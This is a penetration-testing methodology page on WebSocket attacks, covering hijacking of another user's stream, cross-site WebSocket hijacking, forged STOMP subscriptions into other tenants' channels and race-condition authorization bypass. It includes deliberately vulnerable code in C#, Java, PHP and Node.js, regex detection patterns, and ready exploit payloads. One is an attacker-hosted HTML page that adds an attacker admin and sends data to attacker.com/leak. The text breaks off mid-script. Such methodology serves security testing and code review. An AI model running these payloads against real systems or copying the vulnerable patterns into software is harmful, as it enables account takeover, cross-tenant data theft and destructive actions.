# WebSockets

## Check List

## Methodology

### Black Box

#### [Hijacking Private Data Leak](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Sockets#web-socket-protocol)

{% stepper %}
{% step %}
Log into sites that use file summarization or upload processes or artificial intelligence using websocket requests
{% endstep %}

{% step %}
Search for and identify WebSocket endpoints in Burp Suite
{% endstep %}

{% step %}
Upload a private file, start AI summary, send a message, etc
{% endstep %}

{% step %}
Keep the WebSocket connection open
{% endstep %}

{% step %}
Filter by WS, right-click the upgrade request, Copy, Copy as cURL like

```http
GET /ai/wsio/?EIO=4&transport=websocket HTTP/2
Host: www.target.com
Cookie: session=abc123...
```
{% endstep %}

{% step %}
Paste into Burp Repeater, WebSocket tab
{% endstep %}

{% step %}
Create a new WebSocket connection using the same cookies (from your logged-in session)
{% endstep %}

{% step %}
Just wait, do not upload anything from this session
{% endstep %}

{% step %}
Trigger AI summary, chat message, or any real-time action
{% endstep %}

{% step %}
Go back to your Burp WebSocket, If you see messages like

```json
{
  "contentItem": {
    "id": 987654,
    "content": "This is another user's private document...",
    "summary": "AI summary of secret file...",
    "isPublic": false
  }
}
```
{% endstep %}

{% step %}
WebSocket Hijacking, Private Data Leak CONFIRMED
{% endstep %}
{% endstepper %}

***

### White Box

#### Cross-Site WebSocket Hijacking (CSWSH) via Origin Verification Asymmetry

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on real-time features that rely on persistent, bi-directional communication (e.g., Live Chat, Financial Trading Tickers, Collaborative Document Editing) utilizing the `ws://` or `wss://` protocols
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the backend WebSocket handshake and connection upgrade middleware
{% endstep %}

{% step %}
Identify the "Session Cookie Overloading" architecture. The enterprise application utilizes robust HTTP-Only cookies for its primary REST API authentication. To avoid implementing a secondary, token-based authentication mechanism specifically for WebSockets, the developers configure the WebSocket endpoint to inherently trust and utilize the exact same HTTP session cookies transmitted during the initial `101 Switching Protocols` handshake
{% endstep %}

{% step %}
Investigate the Cross-Origin Resource Sharing (CORS) equivalent for WebSockets. Standard HTTP requests rely on the Same-Origin Policy (SOP) and CORS preflight requests to prevent cross-site data theft. However, the WebSocket specification explicitly bypasses the SOP. Browsers _will_ send cross-origin WebSocket connection requests, and they _will_ attach the victim's ambient session cookies to that request
{% endstep %}

{% step %}
Analyze the Origin Validation logic. Because the browser does not enforce SOP for WebSockets, the burden of verifying the `Origin` header falls entirely on the backend server
{% endstep %}

{% step %}
Discover the fatal validation gap: To support deeply integrated third-party widgets, mobile applications (which often send `Origin: null` or no Origin at all), or local developer environments, the backend developer implements a permissive Origin check, returning `true` universally, or utilizing a dangerously loose regular expression
{% endstep %}

{% step %}
Understand the vulnerability: If an attacker can lure an authenticated enterprise user to an external, attacker-controlled website, the attacker's website can execute `new WebSocket('wss://api.enterprise.tld/chat')`. The victim's browser will attach their highly privileged enterprise session cookies to the handshake. Because the backend accepts all Origins, the socket upgrades successfully
{% endstep %}

{% step %}
Formulate the CSWSH payload. The attacker's external webpage establishes a full-duplex WebSocket connection directly to the enterprise backend, authenticated as the victim
{% endstep %}

{% step %}
Construct the exploit page to silently interact with the WebSocket API. Instruct the socket to send administrative RPC commands (e.g., `{"action": "GRANT_ACCESS", "user": "attacker"}`) or subscribe to sensitive data streams
{% endstep %}

{% step %}
The backend, evaluating the valid session cookie, processes the malicious frames and streams the highly classified enterprise data directly back to the attacker's external webpage, achieving a persistent, bi-directional Cross-Site Request Forgery (CSRF) and data exfiltration channel
{% endstep %}

{% step %}
**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(if\s*\(origin\.Contains\(".*"\)\)\s*return\s*true;)
|(options\.AddPolicy\(.*\.AllowAnyOrigin\(\))
|(builder\.AllowAnyOrigin\(\))
```
{% endtab %}

{% tab title="Java" %}
```regexp
(\.setAllowedOrigins\(['"]\*['"]\))
|(\.setAllowedOriginPatterns\(['"]\*['"]\))
|(registry\.addHandler\(.*\)\.setAllowedOrigins\(['"]\*['"]\))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(header\('Access-Control-Allow-Origin:\s*\*'\))
|(header\("Access-Control-Allow-Origin:\s*\*"\))
|(if\s*\(\$origin.*\)\s*\{\s*return\s+true;)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(VerifyOrigin:\s*\(origin\)\s*=>\s*true)
|(checkOrigin\s*=\s*.*return\s+true;)
|(origin:\s*true)
|(origin:\s*['"]\*['"])
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
if\s*\(origin\.Contains\(".*"\)\)\s*return\s*true;|options\.AddPolicy\(.*\.AllowAnyOrigin\(\)|builder\.AllowAnyOrigin\(\)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\.setAllowedOrigins\(['"]\*['"]\)|\.setAllowedOriginPatterns\(['"]\*['"]\)|registry\.addHandler\(.*\)\.setAllowedOrigins\(['"]\*['"]\)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
header\('Access-Control-Allow-Origin:\s*\*'\)|header\("Access-Control-Allow-Origin:\s*\*"\)|if\s*\(\$origin.*\)\s*\{\s*return\s+true;
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
VerifyOrigin:\s*\(origin\)\s*=>\s*true|checkOrigin\s*=\s*.*return\s+true;|origin:\s*true|origin:\s*['"]\*['"]
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddSignalR();
    
    // [1]
    // [2]
    services.AddCors(options =>
    {
        options.AddPolicy("AllowAll", builder =>
        {
            // [3]
            // [4]
            // Allowing any origin while permitting credentials ensures the 
            // SignalR hub is completely exposed to CSWSH.
            builder.SetIsOriginAllowed(_ => true)
                   .AllowAnyHeader()
                   .AllowAnyMethod()
                   .AllowCredentials();
        });
    });
}

public void Configure(IApplicationBuilder app, IWebHostEnvironment env)
{
    app.UseCors("AllowAll");
    app.UseEndpoints(endpoints =>
    {
        endpoints.MapHub<EnterpriseHub>("/ws/enterprise-stream");
    });
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Configuration
@EnableWebSocketMessageBroker
public class WebSocketConfig implements WebSocketMessageBrokerConfigurer {

    @Override
    public void registerStompEndpoints(StompEndpointRegistry registry) {
        // [1]
        // [2]
        // The developer relies on HTTP cookies for authentication.
        // [3]
        // [4]
        // Fatal Configuration: Setting allowed origins to "*" completely disables 
        // the server-side CSRF protection mechanism for the WebSocket handshake.
        registry.addEndpoint("/ws/enterprise-stream")
                .setAllowedOrigins("*") 
                .withSockJS();
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function register()
{
    // [1]
    // [2]
    $this->app->singleton('websocket', function ($app) {
        return new EnterpriseHub();
    });

    $this->app['router']->middleware('cors', function ($request, $next) {

        $response = $next($request);

        // [3]
        // [4]
        // Allowing any origin while permitting credentials ensures the
        // SignalR hub is completely exposed to CSWSH.
        $response->headers->set('Access-Control-Allow-Origin', $request->headers->get('Origin'));
        $response->headers->set('Access-Control-Allow-Headers', '*');
        $response->headers->set('Access-Control-Allow-Methods', '*');
        $response->headers->set('Access-Control-Allow-Credentials', 'true');

        return $response;
    });
}

public function boot()
{
    Route::middleware(['cors'])->group(function () {
        Route::match(['GET', 'POST'], '/ws/enterprise-stream', [EnterpriseHub::class, 'handle']);
    });
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const WebSocket = require('ws');
const sessionParser = require('./middleware/session');

const wss = new WebSocket.Server({ 
    port: 8080,
    // [1]
    // [2]
    // [3]
    // [4]
    // The verifyClient callback explicitly returns true for all origins,
    // completely neutralizing cross-origin handshake protections.
    verifyClient: (info, done) => {
        sessionParser(info.req, {}, () => {
            if (info.req.session && info.req.session.userId) {
                done(true); // Authenticated via cookie, ignores info.origin
            } else {
                done(false, 401, 'Unauthorized');
            }
        });
    }
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture leverages persistent WebSocket connections to deliver low-latency telemetry or bidirectional chat functionality, \[2] To avoid the complexity of passing JWTs securely over WebSocket subprotocols, the architecture falls back to standard, ambient HTTP Session Cookies during the HTTP `UPGRADE` request, \[3] The WebSocket protocol specification dictates that web browsers explicitly bypass the Same-Origin Policy (SOP) for socket initiations, forcing the backend server to manually validate the `Origin` HTTP header, \[4] The execution sink. Developers erroneously treat the `Origin` check as a mere CORS annoyance rather than a critical CSRF barrier. By configuring the WebSocket server to accept connections from any origin (e.g., `*` or a loose wildcard), the server blindly accepts cross-site connection requests. The attacker leverages this by hosting a malicious page. When the authenticated victim visits the attacker's page, the browser automatically attaches the enterprise session cookies to the outbound `wss://` handshake. The socket opens, bridging the attacker's JavaScript directly to the victim's authenticated enterprise session

```http
// 1. Attacker identifies a permissive WebSocket endpoint relying on cookie authentication.
// 2. Attacker hosts the following HTML payload at https://attacker.com/exploit.html.

<!DOCTYPE html>
<html>
<head>
    <title>Claim your prize!</title>
</head>
<body>
    <h1>Loading...</h1>
    <script>
        // 3. The victim's browser initiates the cross-origin connection.
        // 4. The browser automatically attaches the Cookie: session_id=SECURE_AUTH_COOKIE.
        const ws = new WebSocket('wss://api.enterprise.tld/ws/enterprise-stream');

        ws.onopen = function() {
            // 5. Connection established! The attacker is now authenticated as the victim.
            
            // 6. Subscribe to highly sensitive internal telemetry.
            ws.send(JSON.stringify({
                action: "SUBSCRIBE",
                channel: "admin_audit_logs"
            }));

            // 7. Execute state-mutating commands on behalf of the victim.
            ws.send(JSON.stringify({
                action: "ADD_ADMIN_USER",
                email: "attacker@evil.com"
            }));
        };

        ws.onmessage = function(event) {
            // 8. Exfiltrate the real-time stream data out-of-band.
            fetch('https://attacker.com/leak', {
                method: 'POST',
                body: event.data
            });
        };
    </script>
</body>
</html>
```
{% endstep %}

{% step %}
To unify authentication mechanisms across standard REST endpoints and real-time streams, platform architects configured their WebSocket middleware to consume ambient HTTP session cookies. This design choice inherently shifted the burden of Cross-Site Request Forgery (CSRF) protection onto the WebSocket handshake's Origin validation layer. The security posture collapsed when developers, prioritizing integrations with external clients and development environments, applied permissive Origin reflection policies. They failed to recognize that WebSockets are explicitly exempt from the browser's native Same-Origin Policy constraints. The attacker exploited this specification by orchestrating a hostile web context. Upon luring the authenticated victim, the attacker's JavaScript initiated a cross-origin socket upgrade. The victim's browser faithfully delivered the ambient session cookies, and the permissive backend validated the authentication while disregarding the hostile Origin. This established a persistent, bi-directional conduit, granting the attacker silent, authenticated RPC execution and real-time data exfiltration capabilities
{% endstep %}
{% endstepper %}

***

#### Horizontal Privilege Escalation via Pub/Sub Sub-Protocol Decoupling

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on complex event-driven WebSockets utilizing high-level messaging sub-protocols over the raw TCP socket (e.g., STOMP, WAMP, GraphQL Subscriptions, or Socket.io namespaces)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the WebSocket message broker and channel authorization routing
{% endstep %}

{% step %}
Identify the "Message Broker" architecture. Managing raw JSON strings over WebSockets is chaotic for massive applications. Developers employ robust sub-protocols like STOMP (Simple Text Oriented Messaging Protocol) to provide publisher/subscriber (Pub/Sub) semantics. The client connects once, then sends `SUBSCRIBE` frames to specific topics (e.g., `/topic/tenant-A/updates`)
{% endstep %}

{% step %}
Investigate the Authentication boundary. The backend secures the initial WebSocket connection perfectly. During the `101 Switching Protocols` handshake, or the initial `CONNECT` frame, the backend verifies the user's JWT, extracting their Identity and Tenant ID (e.g., `Tenant: A`)
{% endstep %}

{% step %}
Analyze the Authorization boundary. After the connection is established, the user begins sending `SUBSCRIBE` frames to join various data channels
{% endstep %}

{% step %}
Discover the fatal Context Decoupling: The developer assumes that because the physical TCP socket is authenticated to `Tenant A`, the frontend SPA will naturally only request to subscribe to `/topic/tenant-A/...`. They implement strict authorization logic on the `CONNECT` event but completely omit explicit role-based access controls on the subsequent `SUBSCRIBE` events
{% endstep %}

{% step %}
Understand the vulnerability: The WebSocket connection operates as a persistent tunnel. Once inside the tunnel, the message broker (e.g., RabbitMQ, ActiveMQ, or an in-memory Spring broker) routes messages purely based on the destination header provided in the frame. If the application does not intercept and validate every single `SUBSCRIBE` frame against the user's authenticated context, the broker will obediently bind the socket to any requested channel
{% endstep %}

{% step %}
Formulate the Cross-Tenant Pub/Sub payload. You must establish a perfectly legal, authenticated WebSocket connection, and subsequently forge a sub-protocol routing frame targeting a victim tenant's namespace
{% endstep %}

{% step %}
Connect to the WebSocket endpoint using your low-privilege JWT
{% endstep %}

{% step %}
Send the standard STOMP `CONNECT` frame. The server responds with `CONNECTED`
{% endstep %}

{% step %}
Craft a malicious STOMP `SUBSCRIBE` frame. Instead of subscribing to your authorized namespace (`/topic/tenant-A/invoices`), manually alter the destination header to target a highly classified global topic or a competitor's namespace (e.g., `destination:/topic/tenant-B/invoices` or `destination:/topic/admin/audit`)
{% endstep %}

{% step %}
Transmit the frame over the active socket
{% endstep %}

{% step %}
The backend message broker receives the frame. Lacking a channel-specific authorization interceptor, the broker parses the `destination` header and binds your active socket session to `tenant-B`'s event stream
{% endstep %}

{% step %}
You have successfully achieved Horizontal Privilege Escalation. Every time a user in Tenant B executes an action, the backend broker publishes the classified data to the topic, silently broadcasting the events directly into your unauthorized WebSocket session

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
socket\.join\(req\.body\.room\)
```
{% endtab %}

{% tab title="Java" %}
```regexp
@SubscribeMapping\(['"][^'"]+['"]\)(?![^}]*hasRole)|client\.subscribe\(.*topic
```
{% endtab %}

{% tab title="PHP" %}
```regexp
channel\.bind\(.*request\.channelName\)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
socket\.join\(req\.body\.room\)|client\.subscribe\(.*topic
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
socket\.join\(req\.body\.room\)
```
{% endtab %}

{% tab title="Java" %}
```regexp
@SubscribeMapping\(['"][^'"]+['"]\)(?![^}]*hasRole)|client\.subscribe\(.*topic
```
{% endtab %}

{% tab title="PHP" %}
```regexp
channel\.bind\(.*request\.channelName\)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
socket\.join\(req\.body\.room\)|client\.subscribe\(.*topic
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[Authorize] // Secures the initial connection to the Hub
public class EnterpriseHub : Hub
{
    // [1]
    // [2]
    // [3]
    // [4]
    // The method allows an authenticated user to subscribe to a dynamic group.
    // The developer fails to verify if the user's claims permit access to the requested group name.
    public async Task SubscribeToTenantStream(string tenantId)
    {
        // Blindly adds the active socket connection to the target Group
        await Groups.AddToGroupAsync(Context.ConnectionId, $"TenantStream_{tenantId}");
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Configuration
@EnableWebSocketMessageBroker
public class WebSocketConfig implements WebSocketMessageBrokerConfigurer {

    @Override
    public void configureMessageBroker(MessageBrokerRegistry config) {
        // Defines the broker namespaces
        config.enableSimpleBroker("/topic", "/queue");
        config.setApplicationDestinationPrefixes("/app");
    }

    // [1]
    // [2]
    @Override
    public void configureClientInboundChannel(ChannelRegistration registration) {
        registry.interceptors(new ChannelInterceptor() {
            @Override
            public Message<?> preSend(Message<?> message, MessageChannel channel) {
                StompHeaderAccessor accessor = MessageHeaderAccessor.getAccessor(message, StompHeaderAccessor.class);
                
                // [3]
                // [4]
                // The developer strictly validates the initial CONNECT frame
                if (StompCommand.CONNECT.equals(accessor.getCommand())) {
                    String token = accessor.getFirstNativeHeader("Authorization");
                    validateToken(token); // Throws if invalid
                }
                
                // Fatal Omission: There is NO validation for StompCommand.SUBSCRIBE.
                // The broker blindly trusts the requested destination header.
                return message;
            }
        });
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class ConstraintValidationMiddleware
{
    private $next;

    private array $compiledConstraints = [];

    public function __construct(callable $next)
    {
        $this->next = $next;
    }


    public function invokeAsync($context)
    {
        // [1]
        // [2]
        $field = $context->selection->field;

        $constraintDirective = null;

        foreach ($field->directives as $directive) {

            if ($directive->name === "constraint") {
                $constraintDirective = $directive;
                break;
            }
        }


        if ($constraintDirective !== null) {

            $pattern = $constraintDirective
                ->getArgument("pattern");


            // [3]
            if (!isset($this->compiledConstraints[$field->name])) {

                $this->compiledConstraints[$field->name] =
                    $pattern;
            }

            $regex = $this->compiledConstraints[$field->name];


            foreach (
                $context->selection
                    ->syntaxNode
                    ->arguments as $argument
            ) {

                $inputString = (string)$argument->value;


                // [4]
                // Blocks GraphQL execution pipeline synchronously
                if (!preg_match($regex, $inputString)) {

                    $context->reportError(
                        "Constraint validation failed."
                    );

                    return null;
                }
            }
        }


        return call_user_func(
            $this->next,
            $context
        );
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
// [1]
// [2]
// Connection multiplexing via Socket.io namespaces and rooms
io.use(async (socket, next) => {
    try {
        let token = socket.handshake.auth.token;
        socket.user = await verifyJwt(token); // Validates user identity perfectly
        next();
    } catch (err) {
        next(new Error("Authentication error"));
    }
});

io.on('connection', (socket) => {
    // [3]
    // [4]
    // The developer relies on the client-side SPA to request the correct room.
    // An attacker simply modifies the client code to emit a join request for another tenant's room.
    socket.on('join_tenant_room', (tenantId) => {
        // No authorization check confirming socket.user.tenantId === tenantId
        socket.join(`tenant_events_${tenantId}`);
        socket.emit('system', `Successfully joined tenant ${tenantId}`);
    });
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture processes massive volumes of structured real-time data, requiring an organizational layer (topics, rooms, or groups) above the raw TCP socket, \[2] The backend enforces strong authentication at the gateway. The initial socket handshake is rigorously cryptographically verified, \[3] The architecture assumes a monolithic trust envelope: if a connection is authenticated, the backend trusts the routing instructions provided by that connection, \[4] The execution sink. Modern Pub/Sub over WebSockets demands a two-tier security model: authentication for the connection, and authorization for the specific channel subscription. Developers frequently conflate the two, deploying authentication interceptors while omitting subscription interceptors. The attacker exploits this decoupled state. By handcrafting raw STOMP or Socket.io frames directly over the authorized socket, the attacker manipulates the `destination` routing header. The underlying message broker, lacking contextual authorization middleware, eagerly registers the attacker's socket to the highly classified target channel, enabling passive, real-time cross-tenant data exfiltration

```http
// 1. Attacker logs into the enterprise platform as a standard user in Tenant A.
// 2. Attacker intercepts the WebSocket handshake and establishes the connection.

// 3. Raw WebSocket Frame (Client -> Server) - STOMP Connect
CONNECT
accept-version:1.1,1.0
heart-beat:10000,10000
Authorization:Bearer <tenant_A_token>
^@

// 4. Raw WebSocket Frame (Server -> Client) - Success
CONNECTED
version:1.1
heart-beat:0,0
^@

// 5. The attacker's SPA natively attempts to subscribe to Tenant A's invoice stream:
// SUBSCRIBE
// id:sub-0
// destination:/topic/invoices/tenant-A
// ^@

// 6. The attacker uses Burp Suite or a custom Python script to drop the legitimate frame 
//    and inject a forged SUBSCRIBE frame targeting Tenant B (a competitor) or an Admin topic.

SUBSCRIBE
id:sub-1
destination:/topic/invoices/tenant-B
^@

// 7. The Spring Boot message broker processes the frame. Since it only intercepts CONNECT 
//    commands for authorization, the SUBSCRIBE command is routed directly to the SimpleBroker.
// 8. The broker binds the attacker's session ID to `/topic/invoices/tenant-B`.

// 9. Raw WebSocket Frame (Server -> Client) - Real-time Data Exfiltration
MESSAGE
destination:/topic/invoices/tenant-B
content-type:application/json
subscription:sub-1
message-id:msg-9921

{"invoiceId": "INV-8812", "amount": 500000, "customer": "Acme Corp"}
^@
```
{% endstep %}

{% step %}
To support complex, multi-tenant real-time data streaming, engineers deployed sophisticated Pub/Sub protocols (like STOMP) over persistent WebSocket connections. This architecture abstracted the raw TCP layer into logical messaging channels. The security posture failed due to a fundamental collapse in state synchronization between connection authentication and channel authorization. Developers rigorously secured the perimeter—validating cryptographic identities during the initial handshake—but left the internal routing matrix entirely unprotected. They relied on an implicit assumption that the trusted frontend application would only request channels relevant to its designated tenant. The attacker bypassed the UI and manually engineered sub-protocol frames directly over the established socket. By altering the `destination` headers, the attacker manipulated the internal message broker into binding their authenticated session to classified, cross-tenant event streams. This architectural decoupling transformed a secure connection into an unrestricted, real-time wiretap across the enterprise's entire event-driven nervous system
{% endstep %}
{% endstepper %}

***

#### Authorization Bypass via Full-Duplex Async State Desynchronization

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on highly interactive Single Page Applications (SPAs) or browser-based gaming/collaboration tools where the client and server exchange a massive volume of distinct RPC commands over a single WebSocket connection (e.g., `["AUTH", "token"]`, followed by `["UPDATE_PROFILE", {...}]`)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the WebSocket message ingestion loop and the backend event-handling dispatchers
{% endstep %}

{% step %}
Identify the "Stateful Socket" architecture. Standard REST APIs are stateless; every request must carry a JWT. To optimize WebSocket bandwidth, developers authenticate the socket _once_. The backend parses the JWT and binds the resulting User Object directly to the active socket instance in memory (e.g., `ws.currentUser = userObject`). All subsequent messages on that socket inherently trust `ws.currentUser`
{% endstep %}

{% step %}
Investigate the Message Processing Pipeline. The backend must listen for incoming frames and process them based on their `action` payload. Because operations (like database writes) involve I/O latency, the message handler is implemented asynchronously (e.g., `ws.on('message', async (data) => {...})`)
{% endstep %}

{% step %}
Analyze the Full-Duplex asynchronous vulnerability. WebSockets are full-duplex TCP streams. The client can blast 100 distinct message frames to the server in 5 milliseconds. The Node.js Event Loop or C# Task Scheduler receives these frames and fires the `on('message')` handler concurrently for each frame
{% endstep %}

{% step %}
Discover the fatal Privilege Downgrade/Upgrade overlap: Consider an application where users can dynamically elevate or downgrade their socket's privilege level (e.g., switching from a "Viewer" role to an "Admin" role by sending an `ELEVATE` command with a 2FA code, or simply logging out of the socket via a `DEAUTH` command)
{% endstep %}

{% step %}
Understand the Race Condition: If an attacker sends an `ELEVATE` command, the backend initiates a 100ms async database check. If the attacker immediately sends a highly destructive `DELETE_SYSTEM` command 1ms later, the backend initiates the authorization check for the second command
{% endstep %}

{% step %}
Formulate the State Desynchronization payload. The attacker exploits the temporal window where the socket's state object in memory is actively being mutated, but previous or subsequent asynchronous frames are evaluating that exact same memory reference
{% endstep %}

{% step %}
Payload Strategy (The "Late De-Auth" Bypass): The attacker establishes a fully authenticated socket connection as a high-privilege user (or a temporary administrative session that is about to expire).The backend socket object holds `ws.isAdmin = true`.The attacker sends a massive array of destructive commands (e.g., 50 `DELETE_USER` frames) perfectly packed in a single network burst, Concurrently (or immediately preceding), the system forces a `DEAUTH` or token expiration event on the socket, setting `ws.isAdmin = false,` Because the 50 `DELETE_USER` frames were already ingested and are currently awaiting I/O (e.g., checking a rate-limit database), they capture the `ws.isAdmin = true` state _before_ the de-auth completes
{% endstep %}

{% step %}
Alternative Payload Strategy (The "Un-Awaited Context Bleed"):The application processes arrays of messages. `socket.on('message', async (msgs) => { for(let msg of msgs) { await process(msg); } })`. If `socket.user` is overwritten dynamically during the loop, rapid interleaving of authentication and action frames causes the execution context of Frame A to bleed into the execution context of Frame B
{% endstep %}

{% step %}
Execute the synchronized burst. The backend processes the frames concurrently. Due to asynchronous scheduling, the state mutation (authentication/de-authentication) overlaps with the business logic evaluation, causing the backend to authorize destructive commands using stale or bleeding in-memory socket state, achieving complete authorization bypass via pure temporal manipulation

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Task\.Run\(\(\)\s*=>\s*ProcessMessageAsync\(message\)\)|_activeUser\s*=\s*await\s+Validate
```
{% endtab %}

{% tab title="Java" %}
```regexp
userContext\s*=\s*await\s+Validate
```
{% endtab %}

{% tab title="PHP" %}
```regexp
socket->currentUser\s*=|currentUser\s*=
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
ws\.on\(['"]message['"],\s*async\s*\(.*?\)\s*=>|socket\.currentUser\s*=
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Task\.Run\(\(\)\s*=>\s*ProcessMessageAsync\(message\)\)|_activeUser\s*=\s*await\s+Validate
```
{% endtab %}

{% tab title="Java" %}
```regexp
userContext\s*=\s*await\s+Validate
```
{% endtab %}

{% tab title="PHP" %}
```regexp
socket->currentUser\s*=|currentUser\s*=
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
ws\.on\(['"]message['"],\s*async\s*\(.*?\)\s*=>|socket\.currentUser\s*=
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
private async Task ReceiveMessagesAsync(WebSocket webSocket)
{
    var buffer = new byte[1024 * 4];
    var context = new SocketContext { Role = "GUEST" };

    while (webSocket.State == WebSocketState.Open)
    {
        var result = await webSocket.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
        var message = Encoding.UTF8.GetString(buffer, 0, result.Count);
        
        // [1]
        // [2]
        // Fire-and-forget processing allows massive concurrency on a single socket
        _ = Task.Run(async () => 
        {
            var payload = JsonConvert.DeserializeObject<SocketMessage>(message);

            // [3]
            // [4]
            if (payload.Action == "AUTH")
            {
                var user = await _authService.ValidateAsync(payload.Token);
                // Mutates the shared context reference asynchronously
                context.Role = user.Role; 
            }
            else if (payload.Action == "WIPE_DATA")
            {
                // Evaluates the shared context, susceptible to Race Conditions
                if (context.Role != "ADMIN") return;
                
                await _dataService.WipeAsync();
            }
        });
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
private async void receiveMessages(WebSocket webSocket) throws Exception
{
    SocketContext context = new SocketContext();
    context.setRole("GUEST");

    while (webSocket.isOpen())
    {
        String message = webSocket.receive();

        // [1]
        // [2]
        // Fire-and-forget processing allows massive concurrency on a single socket
        CompletableFuture.runAsync(() ->
        {
            SocketMessage payload =
                JsonSerializer.deserialize(
                    message,
                    SocketMessage.class
                );

            // [3]
            // [4]
            if ("AUTH".equals(payload.getAction()))
            {
                User user =
                    authService.validate(
                        payload.getToken()
                    );

                // Mutates the shared context reference asynchronously
                context.setRole(
                    user.getRole()
                );
            }
            else if ("WIPE_DATA".equals(payload.getAction()))
            {
                // Evaluates the shared context, susceptible to Race Conditions
                if (!"ADMIN".equals(context.getRole()))
                    return;

                dataService.wipe();
            }
        });
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
private function receiveMessages(WebSocket $webSocket)
{
    $context = (object)[
        'Role' => 'GUEST'
    ];

    while ($webSocket->isOpen()) {

        $message = $webSocket->receive();

        // [1]
        // [2]
        // Fire-and-forget processing allows massive concurrency on a single socket
        go(function () use ($message, $context) {

            $payload = json_decode($message);

            // [3]
            // [4]
            if ($payload->Action === "AUTH") {

                $user = $this->authService->validate($payload->Token);

                // Mutates the shared context reference asynchronously
                $context->Role = $user->Role;
            }
            else if ($payload->Action === "WIPE_DATA") {

                // Evaluates the shared context, susceptible to Race Conditions
                if ($context->Role !== "ADMIN") {
                    return;
                }

                $this->dataService->wipe();
            }
        });
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
wss.on('connection', function connection(ws) {
    // Initial state is unauthenticated
    ws.isAuthenticated = false;
    ws.userRole = 'GUEST';

    // [1]
    // [2]
    // Asynchronous message listener. Concurrent frames fire this callback 
    // simultaneously, running in parallel without locking the socket state.
    ws.on('message', async function incoming(message) {
        const payload = JSON.parse(message);

        // [3]
        // [4]
        // State Mutation Event
        if (payload.action === 'AUTH') {
            // Takes ~50ms to query the database
            const user = await Database.verifyToken(payload.token);
            if (user) {
                ws.isAuthenticated = true;
                ws.userRole = user.role; // e.g., 'ADMIN'
            } else {
                ws.isAuthenticated = false;
                ws.userRole = 'GUEST';
            }
            return;
        }

        // Business Logic Event
        if (payload.action === 'DELETE_TENANT') {
            // The fatal flaw: If an attacker sends an AUTH with a GUEST token, 
            // the database check takes 50ms. 
            // If they immediately send DELETE_TENANT 1ms later, THIS line evaluates 
            // BEFORE the GUEST auth finishes. It uses the previous state.
            if (!ws.isAuthenticated || ws.userRole !== 'ADMIN') {
                return ws.send("Unauthorized");
            }

            await Database.deleteTenant(payload.tenantId);
            ws.send("Tenant Deleted");
        }
    });
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture handles a massive throughput of commands over a single WebSocket connection. To ensure high responsiveness, incoming message frames are processed concurrently via asynchronous handlers, \[2] To eliminate the overhead of transmitting and cryptographically validating a JWT with every single message frame, the backend implements a stateful socket object, \[3] The architecture supports dynamic privilege manipulation (e.g., logging in, stepping up to an admin role, or demoting a session) directly over the active socket without forcing a TCP disconnect, \[4] The execution sink. Developers erroneously modeled the WebSocket execution environment as a strictly sequential queue. They failed to implement locking mechanisms (Mutex/Semaphores) around the socket's state object. Because the network layer operates in full-duplex, an attacker can transmit a continuous, highly compressed stream of frames. By interleaving an asynchronous state-downgrade command (which requires I/O latency) perfectly followed by a high-privilege destructive command, the attacker forces the Node.js or C# scheduler to evaluate the authorization check of the second frame _before_ the state mutation of the first frame completes. The backend blindly authorizes the destructive action using the stale, elevated memory state, achieving catastrophic business logic subversion via pure process timing manipulation

```javascript
// 1. Attacker establishes a WebSocket connection.
const ws = new WebSocket('wss://api.enterprise.tld/ws/gateway');

// 2. Attacker possesses a temporary, low-privilege Admin token that is about to expire,
// or they are an Admin attempting to bypass a forced session-downgrade mechanism.
// For this scenario, let's assume the attacker sends a valid Admin token first.
ws.onopen = () => {
    ws.send(JSON.stringify({ action: 'AUTH', token: 'VALID_ADMIN_TOKEN' }));
    
    // Wait for auth to succeed
    setTimeout(() => {
        // 3. The attacker now wants to execute a destructive action right as their 
